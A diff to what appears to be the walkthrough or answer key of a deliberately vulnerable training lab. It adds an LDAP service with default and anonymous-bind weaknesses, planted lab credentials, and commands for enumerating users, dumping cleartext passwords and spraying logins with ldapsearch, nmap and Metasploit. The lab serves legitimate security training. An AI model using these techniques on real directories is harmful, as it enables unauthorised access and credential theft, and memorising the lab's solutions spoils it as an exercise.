@@ -35,6 +35,7 @@ three IPs are what you scan. The loot refers to the boxes by the hostnames
 |             | Redis          | 6379/tcp  | no auth                 | unauthenticated Redis (→ RCE/key write)|
 |             | SNMP (v2c)     | 161/udp   | community `public`/`private` | default SNMP community strings    |
 |             | Juniper SSG5   | 23/tcp    | `netscreen`/`netscreen` or CVE-2015-7755 | weak telnet creds + hardcoded backdoor |
+|             | LDAP           | 389/tcp   | `admin`/`ldapadmin`, anon bind  | anonymous enumeration + cleartext creds in description |
 | **app01**   | WordPress 4.6  | 80/tcp    | set during install      | outdated WP core/plugins (CVEs)        |
 |             | Tomcat Manager | 8080/tcp  | `tomcat` / `tomcat`     | default manager creds → WAR-to-shell   |
 |             | MySQL          | 3306/tcp  | `root` / `root`         | weak DB root creds                     |
@@ -62,6 +63,9 @@ on purpose (as real users do), so a found password is worth trying elsewhere.
 | `jsmith` / `password123` (again) | RDP (desk01)               | same `jsmith` password reused on the workstation       |
 | `ubuntu` / `ubuntu`      | RDP (desk01)                       | weak built-in workstation account                      |
 | `root` / `root`          | SSH (web01) — the default          | `backups/web01-shadow.bak` cracks to this too          |
+| `trogdon` / `ttrogdon`       | Brocade (app01), LDAP bind (files01)  | LDAP `uid=trogdon` (anon-visible uid); Brocade `show config` output |
+| `dmudd` / `crazypassword`    | Brocade (app01), LDAP bind (files01)  | LDAP `uid=dmudd`; Brocade `show config` output          |
+| `svc-backup` / `Backup2024!` | LDAP bind (files01)                   | LDAP `uid=svc-backup` `description` field (anonymous-readable) |
 
 WordPress accounts only go live after you seed them (see the app01 deploy step).
 
@@ -255,6 +259,29 @@ nmap -sU -p161 <files01-ip>                          # SNMP is UDP
   `public` is read-only, `private` is read-write. On Kali you may need
   `apt-get install -y snmp snmp-mibs-downloader`. The extend output leaks a
   backup-job credential that works on web01.
+
+- LDAP (port 389):
+  ```bash
+  # anonymous bind — enumerate users, groups, and service-account descriptions
+  ldapsearch -x -H ldap://<files01-ip> -b "dc=corp,dc=local" \
+    "(objectClass=inetOrgPerson)" uid cn mail description
+  ldapsearch -x -H ldap://<files01-ip> -b "ou=ServiceAccounts,dc=corp,dc=local"
+  # svc-backup description leaks "passwd: Backup2024!" in plaintext
+
+  # bind as admin — dumps cleartext userPassword for every account
+  ldapsearch -x -H ldap://<files01-ip> -b "dc=corp,dc=local" \
+    -D "cn=admin,dc=corp,dc=local" -w ldapadmin userPassword
+
+  # nmap
+  nmap -p389 --script ldap-search,ldap-rootdse <files01-ip>
+
+  # msf:
+  # use auxiliary/scanner/ldap/ldap_login    (spray the found usernames)
+  # use auxiliary/gather/ldap_query          (full tree dump)
+  ```
+  User bind DNs follow `uid=<username>,ou=Users,dc=corp,dc=local`. The `trogdon`
+  and `dmudd` accounts discovered here are reused on app01's Brocade switch
+  (credential reuse chain).
 
 **app01**
 - Brocade FWS624 / ICX6450 (port 23):
